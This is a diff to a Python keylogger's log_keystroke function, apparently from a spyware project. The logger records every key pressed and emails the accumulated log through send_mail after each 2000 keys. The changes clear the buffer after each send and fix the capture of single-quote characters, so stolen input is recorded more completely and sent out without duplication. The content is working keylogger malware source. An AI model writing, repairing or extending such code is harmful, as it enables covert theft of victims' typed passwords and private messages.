@@ -67,11 +67,16 @@ def log_keystroke(key):
     
     #After 2000 input keys, the logs will be sent through the mailing service script
     if inputCounter >= 2000:
-        inputCounter = 0
+        inputCounter = 0 #reset the counter
         send_mail(logString)
+        logString = "" #reset the input (avoid duplicating the same string over and over)
     
-    inputString = str(key).replace("'", "") #needs fixing: the " ' " character is ignored if written by the user
-    inputString = key_formatter(inputString)
+
+    if str(key).count("'") == 2: #if its anything but a single quote
+        inputString = str(key).replace("'", "") #remove single quotes surrounding the input
+        inputString = key_formatter(inputString)
+    else: #if its a single quote
+        inputString = key_formatter(str(key).replace("\"", "")) #remove the double quotes surrounding the single quote
     logString = logString + inputString
     inputCounter = inputCounter + 1
 
